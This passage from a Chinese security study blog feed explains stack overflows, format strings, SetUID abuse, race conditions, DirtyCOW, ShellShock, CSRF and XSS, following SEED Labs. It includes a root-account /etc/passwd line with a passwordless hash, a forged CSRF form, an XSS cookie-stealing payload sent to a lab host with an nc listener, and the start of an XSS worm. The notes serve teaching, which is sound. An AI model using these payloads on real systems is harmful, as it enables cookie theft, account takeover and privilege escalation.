    <content type="html"><![CDATA[<h3 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h3><p>在低级语言中使用一些内存操作函数（如<code>gets</code> , <code>scanf</code>, <code>vscanf</code>, <code>strcat</code>, <code>strcpy</code>, <code>sprintf</code>, <code>bcopy</code>）操作栈（非动态申请）中的内存时，有可能会因为对函数的误用或者没有做长度校验而使操作的内存空间超出所申请的buffer的范围，从而对本身不应被读写的内存被误读写。他可能会导致栈中的变量被读取或者修改。数据被读取有可能造成机密性被破坏，密钥，密码等等被泄漏（例如心脏滴血漏洞）。数据被修改可能导致校验被绕过（如果攻击者修改了校验位）。而最重要的，因为栈中会保存这个函数返回的地址信息，当这个地址数据被修改时，程序的控制流会被劫持，也就是PC指针会指向一个攻击者指定的地方，从而执行任意指令。</p><h4 id="攻防博弈"><a href="#攻防博弈" class="headerlink" title="攻防博弈"></a>攻防博弈</h4><p>攻击：</p><ol><li>（Ret2Shellcode）攻击者在栈里面布置一段shellcode（原意是可以开启一个shell的代码，其实可以是任意恶意代码的机器码），并修改返回地址，让其指向这段shellcode的开头，当函数执行结束时，会跳转到这段代码开始执行，从而实现RCE（任意代码执行）。这个攻击的条件是，要保证函数返回前，被覆盖的栈中内存不会导致程序崩溃（要顺利执行到函数返回的地方）。</li></ol><p>防御：</p><ol><li>针对攻击1。栈随机化（ASLR：Address space layout randomization）。就是每一次运行相同的程序，他的栈的base位置是随机的，这将导致攻击者无法确定其放在栈里面的shellcode的位置（不知道返回地址那一栏该写什么）。其实ASLR有三个等级。等级为0时，完全没有随机。为1时，将mmap基址、栈随机化，从而库地址、vdso页面也会被随机化。等级为2时，堆也会被随机化。</li><li>针对攻击1。金丝雀值（CANARY）。就是在栈中的变量和返回地址之间放一个随机值，每次函数调用都会产生一个新的随机值，当函数返回时，要检查一下这个值是不是正确。由于攻击者不知道CANARY值，所以没法伪造，系统可以通过这个值来确定栈是不是被破坏过。如果CANARY值不对，就不返回了，会跳到异常处理部分，而攻击者的代码也不会被执行。在linux中，会提示stack smashing detected，并且终止程序。</li><li>针对攻击1。栈不可执行（NX: Non-executable Stack）。栈里面应该存放的都是数据，正常的流程下，PC指针是不会跳到栈里面去执行的。所以当PC进入栈区时，NX会被触发而中断攻击流程，会触发segmentation fault。这个特性在编译的时候可以通过一个选项开启，在ELF文件中的program header中的一个域被声明。</li></ol><p>攻击：</p><ol start="2"><li>针对防御1。ASLR不会将代码段进行随机，所以可以尝试跳转到代码段（ret2text）（内存中任何没有被随机化的地方），利用已有的代码完成一些恶意操作。</li><li>针对防御1。利用别的地方泄漏装载地址&#x2F;栈基址。</li><li>针对防御1。如果没有开启NX的话，并且如果我们可以覆盖很长一段栈空间，那我们可以在shellcode前面先写很长一段废指令，比如nop。如果返回地址命中了这个长长的滑动窗口，那最终会执行到我们的shellcode。这样做可以增加命中的概率。</li><li>针对防御1。不直接覆盖返回地址，而是利用可以控制的栈中存放的数据来完成对返回地址的修改。这个需要看从溢出到返回之间有没有可以通过修改数据来影响到返回地址&#x2F;栈指针的操作。具体情况要具体分析。</li><li>针对防御2。通过别的函数泄漏canary值。</li><li>针对防御2。数组指针越界型可以只修改返回地址，不需要连续覆盖。</li><li>针对防御2。当系统检测到canary值被修改时，会调用stack_check_fail函数，阻断程序继续执行，如果我们可以想办法劫持这个函数指针(劫持GOT表)，从而执行我们所指定的函数&#x2F;shellcode。</li><li>针对防御3。可以尝试到堆区执行。或者可以跳转到代码区&#x2F;装载的共享库区执行代码(Ret2libc)，在栈中布置好函数所需要的参数和以及返回地址等等。</li><li>针对防御3。ROP(Return-Oriented Programming)。就是在栈中布置一些地址。这些地址对应的代码片段gadget都是以ret结束的，所以多个这样的片段可能可以满足图灵完备性，例如libc里面的代码段，这样可以实现跳转至任何函数并传入对应的参数。</li><li>针对防御1。在32位的程序中，栈随机化有19bits的熵，所以栈的base共有2^19&#x3D;524,288种可能性，所以可以尝试暴力枚举方法。64位程序的栈随机化将会更难使用暴力枚举方法攻破。</li></ol><p>防御：</p><ol start="4"><li>针对攻击2。开启PIE以后，代码段和数据段的地址也会被随机化。</li><li>针对攻击8。开启完全RELRO，在程序启动时就绑定所有动态符号，GOT不可写。</li></ol><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>一些函数在做输出的时候会用到格式化字符串，这个串规定了输出的格式等等。如果这个串可以被用户控制，那么恶意的用户可以通过构造这个串实现任意地址读取以及任意地址写入任意值。可以产生格式化字符串漏洞的函数有这些。</p><img src="/2022/06/28/binarySecurity/fmtStr.png" class="" title="危险函数"><p>这个漏洞的原理是，这些函数会维护一个参数指针，每遇到一个<code>%</code>，函数就会将这个指针向下移动并且将指针指向的内容解释为百分号所指定的格式。但是如果我们可以控制格式化字符串的话，我们就相当于可以控制这个指针，从而造成越界的读写。</p><p>例如，我们可以通过向格式化字符串中写入很多 <code>%s</code> 来使得程序崩溃，因为函数会将参数指针指向的内容解释为一个地址，而寻找这个地址指向的字符串。当栈中的内容不是一个地址的时候就会造成段错误。</p><p>我们还可以通过<code>%x</code>  <code>%p</code>，等等来以16进制&#x2F;指针的格式来打印出当前栈上的内容。</p><p>我们可以使用<code>%n</code> 来对指针指向的地址进行写入，写入的值是已经打印出的字符长度数。例如，我们可以覆盖函数返回值从而劫持控制流。并且我们可以通过控制输出的位数（<code>%.12345x</code>）来实现写入任意值。也可以通过指定参数位置来避免输出过多内容如（<code>%2$.08x</code>）表明输出的是第二个参数，我们可以这样来随意移动参数指针。</p><p>要注意的是，如果想要实现任意地址写入，那我们需要在栈上布置好我们要写入的内存地址，这样可以让格式化函数的参数指针移动到这个地址处进行写入。</p><h3 id="环境变量和SetUid程序"><a href="#环境变量和SetUid程序" class="headerlink" title="环境变量和SetUid程序"></a>环境变量和SetUid程序</h3><h4 id="环境变量的传递："><a href="#环境变量的传递：" class="headerlink" title="环境变量的传递："></a>环境变量的传递：</h4><ol><li>如果用 <code>fork</code> 函数创建一个子进程，那么父进程的环境变量会被子进程继承，只有在运行的进程名一项不同。</li><li>如果使用 <code>execve</code> 函数来运行一个新的程序，需要通过第三个参数来吧环境变量传递进去，否则新的程序不会继承原程序的环境变量。</li><li>如果使用 <code>system</code> 函数运行一个新的程序，在system函数的内部调用了 <code>execl</code> 和 <code>execve</code> 从而将当前程序的环境变量传递给了要执行的程序 <code>/bin/sh</code> ，进一步再通过 <code>fork</code> 传递至要运行的新程序中。</li></ol><h4 id="SetUID机制"><a href="#SetUID机制" class="headerlink" title="SetUID机制"></a>SetUID机制</h4><p>当一个程序的所有者是root时，普通用户去运行这个程序，这个程序也拥有root的运行权限，这可以帮助普通用户完成一些需要root权限的操作（例如访问&#x2F;etc&#x2F;passwd文件去修改密码），这些SetUID程序的逻辑都是规定好的，用户没有办法修改。但是用户可以通过修改环境变量来间接影响这些程序的行为。</p><ol><li><p>使用普通用户设置的环境变量，例如PATH，或者自定义的环境变量，运行SetUid程序时会被继承。但是LD_LIBARARY_PATH这类环境变量不会被继承。</p></li><li><p>当一个SetUid程序中使用了 <code>system</code> 函数来运行别的程序时，环境变量会被传入。&#x2F;bin&#x2F;sh会在PATH环境变量中按顺序寻找对应的可执行文件。以 <code>ls</code> 为例，如果我们在PATH前部加入自定义的路径，并且在这个路径下放名为 <code>ls</code> 的程序，那么我们的ls程序就会被执行。例如，我们将如下代码编译为ls程序，放在我们自定义的目录下。我们去调用一个执行 <code>system(&quot;ls&quot;)</code> 的SetUid程序时，由于我们将当前路径放到了PATH前面，所以我们的ls程序会被执行，并且通过运行时的输出我们可以发现euid为0，即以root权限执行。这个方法可以用来在已经获得shell的情况下提权。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">if</span>(geteuid() == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;run as root, euid:%ld\n&quot;</span>, (<span class="hljs-type">long</span>)geteuid());<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;not run as root, euid:%ld\n&quot;</span>, (<span class="hljs-type">long</span>)geteuid());<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>LD_PRELOAD（用来指定用户定义的一些so库），或者LD_LIBRARY_PATH（用来指定一些标准库）这些环境变量会影响加载器&#x2F;链接器的行为。例如，我们在myprog.c里面调用sleep函数，再写一个自己的库mylib封装一个恶意的sleep函数。并使用普通用户把LD_PRELOAD修改为mylib这个库。<ol><li>myprog为非SetUid程序，普通用户调用，恶意函数被执行（说明LD_PRELOAD被继承）。（环境变量+文件上传&#x3D;任意代码执行）</li><li>myprog为SetUid程序，普通用户调用，恶意函数没有被执行（标准库中的sleep被执行）（说明LD_PRELOAD没有被继承）。</li><li>myprog为SetUid程序，使用root修改环境变量LD_PRELOAD，root用户执行，恶意函数被执行（root下有LD_PRELOAD这个变量）。普通用户执行，恶意函数没有被执行。（root下的环境变量+文件上传&#x3D;root下的任意代码执行）</li></ol></li><li>在SetUid程序中使用 <code>system</code> 函数，有可能因为命令注入导致特权命令被执行。<code>execve</code> 函数会防止命令注入。</li><li>在SetUid程序中，其完成一些特权操作以后，会回到正常用户模式，但是在特权模式下申请的一些资源可能还没有释放，回到正常用户态以后仍然可以利用这些已经申请的资源完成特权操作。</li></ol><h3 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h3><ol><li>通过给&#x2F;etc&#x2F;passwd文件追加一行内容，可以实现创建一个root用户，从而获得root权限。可以添加 <code>root:x:0:0:root:/root:/bin/bash</code> 这一行。其中第一个位置为用户名称，root权限并不取决于用户的名称叫root，而是第三个位置的用户ID为0。第二个位置是密码，如果是x，那么密码就被存放在&#x2F;etc&#x2F;shadow文件中。我们也可以直接把密码的哈希值直接放在这里，这样就不用再去修改shadow文件了。我们可以添加这一行内容。 <code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code> 其中这个hash值是ubuntu系统中的一个magic value，不需要输入密码，直接回车就可以登陆。如果不是ubuntu系统，我们可以通过adduser命令增加一个用户，再去查看shadow中对应的值来获取密码的hash值。</li><li>一个典型的竞态条件漏洞是，在一个SetUid程序中，先校验用户的真实ID，查看其是否有对文件的读写权限，然后对文件进行读写，代码如下：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>   <span class="hljs-type">char</span> * fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>   <span class="hljs-type">char</span> buffer[<span class="hljs-number">60</span>];<br>   FILE *fp;<br>   <span class="hljs-comment">/* get user input */</span><br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer );<br><span class="hljs-keyword">if</span>(!access(fn, W_OK))&#123; <br>    <span class="hljs-comment">// *** context switch</span><br>fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);  <br>    fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">1</span>, fp);<br>fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>fclose(fp);<br>  &#125;<br>   <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果context switch发生在***处，此时另外一个程序将&#x2F;tmp&#x2F;XYZ symlink到了&#x2F;etc&#x2F;passwd，那么就会对passwd文件进行读写，造成权限泄漏。</p><p>（是不是所有SetUid程序中先校验，再对文件（因为可以创造软链接）的操作都存在可能的竞态条件漏洞？）（不过也取决于这个校验是什么样子的，是否可以通过控制文件来使得程序通过校验）</p><h3 id="DirtyCOW漏洞"><a href="#DirtyCOW漏洞" class="headerlink" title="DirtyCOW漏洞"></a>DirtyCOW漏洞</h3><p>DirtyCOW漏洞是linux内核中竞态条件漏洞的一个实例，攻击者可以利用这个漏洞获取root权限。当一个普通用户对某一个文件只有读权限时，其可以访问 <code>/proc/self/mem</code> 文件并调用 <code>write</code> 函数对内存进行写入，但是在write内部会判断，如果当前用户拥有只读权限，那么会在内存中进行一次拷贝，所有写的内容会写在新创建的这部分内存中，从而对原文件没有任何影响。在当前的拷贝后的内存不再被使用时，<code>madvice</code> 系统调用会建议操作系统内核删除这份拷贝，并将文件指针指向原来的内存。</p><p>所以 <code>write</code> 的执行顺序是：</p><ol><li>查看权限，如果是只读的话，就对映射的文件内存创建一份拷贝</li><li>修改页表，使得文件指针指向这份拷贝</li><li>写入内存</li></ol><p>但是123步骤并不是原子化的，如果在步骤23之间执行了 <code>madvice</code> 系统调用，那么文件指针就会指向原来的内存，造成越权写入。我们可以创建两个进程，一个进程在循环执行 <code>write</code> 系统调用，另一个在循环执行 <code>madvice</code> 系统调用，那么就可以使用普通用户的身份对 <code>/etc/passwd</code> 文件进行写入，从而获取root权限。</p><p>（和上一章的竞态条件漏洞来比，这个漏洞的问题同样也出在校验后，操作前。<code>write</code> 对用户的权限进行了校验，认为需要创建一份单独的拷贝并将指针指向了拷贝内存，但是 <code>madvice</code> 又让指针指了回去，<code>madvice</code> 的作用和创建软链接的过程有点类似。）</p><h3 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h3><p>原理是bash在解析父进程传递来的环境变量时，会将以 <code>() &#123; </code> 开头的变量解析成为一个函数。如果这个函数定义的后面有跟随一条指令的话，那么这条指令会被执行。有点类似于命令注入（把数据当作了代码并且执行）。受影响的bash版本为4.2.0(1)。常见于使用CGI来处理请求的web服务器上。因为服务器程序接受到输入以后，可能会将一些HTTP头设置为环境变量，然后调用cgi，cgi可能会使用bash脚本来完成任务。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Binary Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF vulnerability</title>
    <link href="/2022/04/17/CSRF/"/>
    <url>/2022/04/17/CSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="跨域请求伪造（XSRF-x2F-CSRF-Cross-Site-Request-Forgery）"><a href="#跨域请求伪造（XSRF-x2F-CSRF-Cross-Site-Request-Forgery）" class="headerlink" title="跨域请求伪造（XSRF&#x2F;CSRF: Cross-Site Request Forgery）"></a>跨域请求伪造（XSRF&#x2F;CSRF: Cross-Site Request Forgery）</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>与之前介绍的XSS漏洞不同，想要触发CSRF漏洞，需要两个条件。第一，用户已经登陆一个受信任的网站，例如<code>http://www.a.com</code>，并生成了cookie并且这个认证没有过期（并不一定需要打开这个tag页，有一些cookie并不是关闭页面以后立即过期的）。第二，需要攻击者诱导用户点击一个恶意的链接，例如 <code>http://www.b.com</code>。这个链接的网站归攻击者所有，所以，当用户点击这个链接时，攻击者设计好的网页上的脚本会被执行。而攻击者则可以在b网页上伪造一次请求发送a网站。此时，由于该请求是发送至a网站的，浏览器会将a网站的cookie附加在这次请求中，从而使得请求成功。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求是发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p><h3 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h3><ol><li>伪造GET请求。在恶意的页面中嵌入img标签，构造参数对目标网站发起请求。</li><li>伪造POST请求。在恶意的页面中提交一个form请求。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">forge_post</span>(<span class="hljs-params"></span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> fields;<br>  <span class="hljs-comment">// The following are form entries need to be filled out by attackers.</span><br>  <span class="hljs-comment">// The entries are made hidden, so the victim won’t be able to see them.</span><br>  fields += <span class="hljs-string">&quot;&lt;input type=’hidden’ name=’name’ value=’****’&gt;&quot;</span>;<br>  fields += <span class="hljs-string">&quot;&lt;input type=’hidden’ name=’briefdescription’ value=’****’&gt;&quot;</span>;<br>  fields += <span class="hljs-string">&quot;&lt;input type=’hidden’ name=’accesslevel[briefdescription]’ value=’2’&gt;&quot;</span>;<br>  fields += <span class="hljs-string">&quot;&lt;input type=’hidden’ name=’guid’ value=’****’&gt;&quot;</span>;<br>  <span class="hljs-comment">// Create a &lt;form&gt; element.</span><br>  <span class="hljs-keyword">var</span> p = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;form&quot;</span>);<br>  <span class="hljs-comment">// Construct the form</span><br>  p.<span class="hljs-property">action</span> = <span class="hljs-string">&quot;http://www.example.com&quot;</span>;<br>  p.<span class="hljs-property">innerHTML</span> = fields;<br>  p.<span class="hljs-property">method</span> = <span class="hljs-string">&quot;post&quot;</span>;<br>  <span class="hljs-comment">// Append the form to the current page.</span><br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(p);<br>  <span class="hljs-comment">// Submit the form</span><br>  p.<span class="hljs-title function_">submit</span>();<br>&#125;<br><span class="hljs-comment">// Invoke forge_post() after the page is loaded.</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-title function_">forge_post</span>();&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li><p>验证码</p><p>观察CSRF的攻击过程实际上就是在用户不知情的情况下发送了请求，而验证码可以强制要求与用户进行交互，所以可以在请求时要求用户输入验证码。但从用户体验角度出发，如果所有请求都添加验证码，也是不现实的。</p></li><li><p>Referer Check</p><p>也就是发送请求时要求Header中带有当前发起请求的页面url。如果发送的不是当前网站的域，那么很有可能是遭遇了CSRF攻击。但是其完全依赖于浏览器发送正确的referer，如果有浏览器的漏洞可以影响到这个字段，那么这种防御机制就会失效。并且一些浏览器出于隐私保护的考虑，限制了referer的发送。<br>虽然不能完全防御CSRF，但是Referer Check可以作为监控CSRF发生的一种手段，是防御的一个充分条件。</p></li><li><p>Secret Token</p><p>当用户发送请求时，服务器端应用将令牌（token）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。而浏览器的同源策略则限制了恶意网页访问令牌的能力。</p></li></ol><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li><a href="https://seedsecuritylabs.org/">SEED Labs</a>.</li><li>Web Security: A white hat perspective, Hanqing Wu.</li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">Wikipedia</a>.</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS vulnerability</title>
    <link href="/2022/04/15/XSS/"/>
    <url>/2022/04/15/XSS/</url>
    
    <content type="html"><![CDATA[<img src="/2022/04/15/XSS/web.jpg" class="" title="WEB Security"><h2 id="跨站脚本攻击（XSS-Cross-Site-Script）"><a href="#跨站脚本攻击（XSS-Cross-Site-Script）" class="headerlink" title="跨站脚本攻击（XSS: Cross-Site Script）"></a>跨站脚本攻击（XSS: Cross-Site Script）</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>从名称上来看，这个漏洞似乎和跨站有关系，但其实这是对其命名时的历史原因，跨不跨站的已经无所谓了，重要的是脚本会被执行。</p><p>出现的原因：很多Web应用需要将用户的输入显示在后续的页面中。例如，我们在某某hub网站注册一个账号，其中你的昵称&#x2F;用户名将会显示在登陆后的页面中。</p><p>对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。这个漏洞的本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下恶意构造的输入不再被当作数据显示，而是被当作一段代码被客户端的浏览器执行。</p><p>XSS的利用可以做到javascript可以做的任何事情。例如可以盗取cookie，进而使用这个cookie进行恶意操作。还可以制作蠕虫病毒进行自我复制。</p><p>这种漏洞是由用户输入引发的。尤其在一些用户的输入既可以展示给自己，也可以展示给别人的应用中危害更大。所以常见于社交媒体，留言系统等网站。</p><h3 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h3><ol><li>使用 <code>alert</code> 函数进行弹窗，没什么实际作用（恐吓？）。我有时候会用 <code>alert</code> 来调试payload，或者单纯用来测试XSS漏洞。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;nmsl&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>使用 <code>document.cookie</code> 读取cookie。</p></li><li><p>使用如下代码在DOM中嵌入一个对img的加载，从而用GET方法将cookie发送到指定主机，escape函数用来编码。</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(’&lt;img src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//10.9.0.1:5555?c=’</span><br>                       + <span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) + ’   &gt;’);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>对应的，在需要接收的主机上开启 <code>nc</code> ，<code>-l</code> 表示listen模式，<code>-nv</code> 表示给出更多输出，<code>-k</code> 表示当结束一次连接以后，继续监听下一次。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lknv 5555<br></code></pre></td></tr></table></figure><ol start="4"><li>通过Ajax在受害者的浏览器上发送伪造请求，GET以及POST请求都可以进行发送，这种攻击不需要访问受害者的cookie，因为代码运行在受害者的浏览器，进行发送时，浏览器会自动将cookie附加在请求头中。</li></ol><p>GET请求：（注意：GET请求的参数用 <code>&amp;</code> 符号连接在url后面）</p><p>使用 <code>window.onload</code> 函数是要在当前页面加载完毕之后再执行这个函数。因为如果没有加载完毕，DOM还没有构造好，一些参数可能还没有初始化而导致攻击失败。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;param1=&quot;</span>+p1; <br><span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;param2=&quot;</span>+p2;  <span class="hljs-comment">//Construct the HTTP request</span><br><span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.xxx.com?&quot;</span>+ts+token;  <span class="hljs-comment">//FILL IN</span><br><span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();<br>&#125; <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>POST请求：（POST请求的参数需要放在content区域）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-comment">//JavaScript code to access param</span><br><span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;p1=&quot;</span>+p1;<br><span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;p2=&quot;</span>+p2;<br><span class="hljs-comment">//Construct the content of your url.</span><br><span class="hljs-keyword">var</span> content=...;<br><span class="hljs-keyword">var</span> sendurl=...;<br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//Create and send Ajax request</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                      <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>&#125; &lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="5"><li>使用DOM中的方法构造蠕虫。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br><span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;  <br><span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;  <br><span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>; <br><span class="hljs-keyword">var</span> wormCode = <span 